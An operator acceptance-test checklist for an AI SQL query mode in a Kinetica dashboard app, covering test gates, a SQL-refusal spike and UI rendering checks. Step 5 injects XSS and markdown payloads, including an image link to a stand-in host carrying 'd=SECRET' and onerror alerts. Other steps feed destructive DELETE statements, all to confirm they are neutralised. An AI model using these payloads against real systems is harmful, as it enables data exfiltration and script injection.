# 140-13 Operator UAT steps

Plan 140-13 Task 2 (human-verify). Task 3 (UAT results + hand bookkeeping) runs after the operator replies.
Steps 0-6 make NO provider request and use NO AI quota. Steps 7 and 8 are OPTIONAL.

## Gates (run by the executor on the integrated tree, 2026-10-21, sequentially)
- Gap gate: `! grep -rnE "it\.fails|GAP-140-" packages/server/tests` holds (0 matches); 140-10 and 140-11 SUMMARY both read `gaps: []`.
- shared: tsc OK; vitest 192 passed (9 files)
- web: tsc OK; vitest --maxWorkers=4: 251 files passed, 1 skipped, 4953 tests passed, 1 skipped; theme-guard: 172 passed
- server: tsc OK; test-gate: 2526/2586 tests passed, 12 files failing: 8 known set (auth.oidc, auth.routes, boot.hardening, boot.wipe, bootstrap, db.smoke, oidc.module, routes.wms); 3 pass alone (auth.login-rbac, routes.exports, routes.management = TD-V16-TEST-ISOLATION contamination); `lib.exportRunner.memory` EXPMEM-zip-backpressure times out at 60 s even alone, and fails identically in a worktree at pre-phase commit 4536a0c (export code untouched by Phase 140), so it is machine-load/environmental, not a Phase 140 regression. The gate script therefore reports "GATE FAILED" on that one file only.
- Spike dry-run (`npx tsx src/spikes/queryModeSpike.ts --dry-run`): 8 accepted analyst queries, 11 refused (INSERT/CREATE TABLE AS/DELETE/UPDATE, semicolon, comment, ki_catalog, QUALIFY, TOP, other schema table); "must-refuse violations: 0".
- Deploy bundle (no network): `npm run build:server` OK; `grep -c 'from "libpg-query"' packages/server/dist/index.js` = 1 (kept external); `await import('libpg-query'); loadModule(); parse('SELECT 1').stmts.length` prints 1.
- Node-20 Docker image NOT built by the executor (Docker is running locally but the build needs the network); routed to optional step 8.
- No provider or Kinetica call was made by the executor; packages/server/.env was not read.

## Known test-strength gaps (so you know where your eyes are the real proof)
- jsdom cannot prove legibility in LIGHT/DARK, SQL wrapping, or that no network request fires for markup: steps 3, 4, 5 are the real proof.
- Real Kinetica error texts (D-18 category calibration), quoted-name case behaviour, row-cap cost on the server, and real job cancellation are live-only: step 1 (spike) is the real proof.
- Live model adherence to the query-mode rules is unverified here (step 7 is OPTIONAL; Phase 142 runs the live provider UAT).
- The Node-20 deploy image is unverified locally (step 8 OPTIONAL).
- The grep criteria in this plan that count test titles/symbols show presence only; the specs were the proof.

## Prerequisites
- Dev app running (`npm run dev`). `__kbiAiHarness` exists only in dev builds and only on a dashboard page.
- Sign in with Kinetica credentials as a user WITH "Use AI". If Kinetica is unreachable, reply "defer" and the plan pauses like 138-08/139-14.
- Use a TEST dashboard (default dashboard 12 with table 1 `demo.nyctaxi`). Harness changes are never saved; reload or `__kbiAiHarness.discard()` clears them.
- Console: Option+Cmd+J; if Chrome warns about pasting, type `allow pasting` and Enter once.
- Claude can drive your signed-in Chrome over CDP for the browser steps (139-14 precedent: dashboard 12, temp ai widget via POST /api/dashboards/12/widgets {type:"ai"}, restored afterwards) and can run the spike in your terminal if you ask. You edit packages/server/.env yourself (Claude never reads it). The dev server currently runs `AI_DATA_ACCESS=schema` with an invalid `AI_MODEL`, which is fine for steps 3-5 (chatTurn is a harness injection, no provider call).

## Verify
Do every VISUAL step in LIGHT and then DARK mode. Steps 1-6 make NO provider request and use NO AI quota. `const h = __kbiAiHarness; h.help();` first.

0. Record the Kinetica version (expected 7.2.3.12 as in 139; say if different).
1. Live harness (terminal, quota-free): `cd packages/server && npx tsx src/spikes/queryModeSpike.ts` (uses your local .env non-admin user; prints no values or password). Record each line Q1-Q8: Q1 rowCount 200 + truncated + elapsed ms; Q2 "query timed out" and no tagged job left in /admin/show/jobs; Q3 "query cancelled" and no tagged job left; Q4 INSERT / CREATE TABLE AS / DELETE all refused with 0 statements sent; Q5 the dialect table (note any real analyst query refused, and any PG-valid query Kinetica rejected); Q6 the category the port returned vs the raw Kinetica message (is each category right?); Q7 which quoted-name forms work; Q8 profile counts and the number of top values. OPTIONAL: watch Workbench/GAdmin Jobs during Q2/Q3 to see the job disappear (look for the tagged query_text in /admin/show/jobs).
2. Query mode on: stop the server, set `AI_DATA_ACCESS=query` in packages/server/.env, start it. The server log line shows `dataAccess=query` and `queryMaxRows=200 queryMaxChars=20000 queryTimeoutMs=30000 queryMaxPerAnswer=5`.
3. "Ran N queries" (LIGHT and DARK, large AI tile with inline chat): `__kbiAiHarness.chatTurn("How many trips per vendor?", "Vendor CMT has the most trips.", { queries: [{ sql: "SELECT vendor_id, COUNT(*) AS n FROM demo.nyctaxi GROUP BY vendor_id", rowCount: 5, outcome: "ok" }, { sql: "DELETE FROM demo.nyctaxi", outcome: "refused", reason: "only a single SELECT (or WITH ... SELECT) is allowed" }, { sql: "SELECT COUNT(*) FROM demo.nyctaxi a, demo.nyctaxi b", outcome: "timed_out" }] })`. Expected: under the answer a ghost button "Ran 3 queries", collapsed; click: three muted lines "<SQL> - 5 rows", "<SQL> - refused: ...", "<SQL> - timed out", same muted style as other chat notes, button height/style matches the other chat buttons; click again collapses. Legible in both themes.
4. Long SQL wrapping (LIGHT and DARK): `__kbiAiHarness.chatTurn("Long", "Done.", { queries: [{ sql: "SELECT " + Array.from({ length: 40 }, (_, i) => "column_name_number_" + i).join(", ") + " FROM demo.nyctaxi", rowCount: 1, outcome: "ok" }] })`, expand: the SQL wraps inside the chat column (no horizontal scroll, no overflow past the tile). Repeat on a SMALL AI tile (drawer presentation) and check the drawer too.
5. Markup literal (SC3, LIGHT and DARK): open DevTools Network (clear it), then `__kbiAiHarness.chatTurn("markup", "![x](https://evil.test/x.png?d=SECRET) [click](javascript:alert(1)) [site](https://evil.test) <img src=x onerror=alert(1)> <b>bold</b> **bold** # heading", { queries: [{ sql: "SELECT '<img src=x onerror=alert(2)>' AS a FROM demo.nyctaxi", rowCount: 1, outcome: "ok" }] })` and expand the list. Expected: the answer bubble shows the exact characters (no image, no link, no bold, no heading), the query line shows the literal tag, no alert dialog, and the Network tab has NO request to evil.test and none to `x`.
6. Schema mode back: set `AI_DATA_ACCESS=schema` (or remove the line), restart; log line shows `dataAccess=schema`. (Tools not offered in schema mode is proven by RQ-3 / EGX-Q1; nothing to click.)
7. OPTIONAL live ask in query mode (uses Gemini quota; real model id; `AI_TIMEOUT_MS` >= 120000; restart after .env changes; skip is fine, Phase 142 runs the live provider UAT): ask "How many trips does each vendor have? Answer in words and don't change the dashboard." Report only: did "Ran N queries" appear (yes/no), did the SQL look right, was the answer in words, any error text; then `sqlite3 packages/server/data/kinetica.db "SELECT queries_json FROM ai_audit ORDER BY id DESC LIMIT 1"` shows SQL + rowCount + durationMs and no row values (yes/no).
8. OPTIONAL deploy image (Node 20): if Docker is available, `docker build --target server -t kbi-server-140 .` then `docker run --rm kbi-server-140 node -e "import('libpg-query').then(async m => { await m.loadModule(); console.log((await m.parse('SELECT 1')).stmts.length) })"` prints 1.

## Cleanup
- Set `AI_DATA_ACCESS` back to your preferred value (schema or query) and restart the server. `__kbiAiHarness.discard()` or reload clears harness changes. Restore any temp AI widget created for CDP driving.

## Reply format
One message: `approved` or a numbered issue list by step (with LIGHT/DARK verdict for steps 3, 4, 5), then:
`0: Kinetica version <x.y.z>`
`1: Q1-Q8 lines (rowCount/truncated/ms, timeout, cancel, writes refused, dialect notes, category vs raw message, quoted-name forms, profile counts)`
`5: no request to evil.test: yes/no`
`7: skipped` or `7: ran - Ran N queries yes/no, SQL ok yes/no, answer in words yes/no, audit row ok yes/no, errors: <text>`
`8: skipped` or `8: ran - printed 1 yes/no`
Or just `defer` (no Kinetica sign-in): the plan pauses and the two requirements stay Pending.
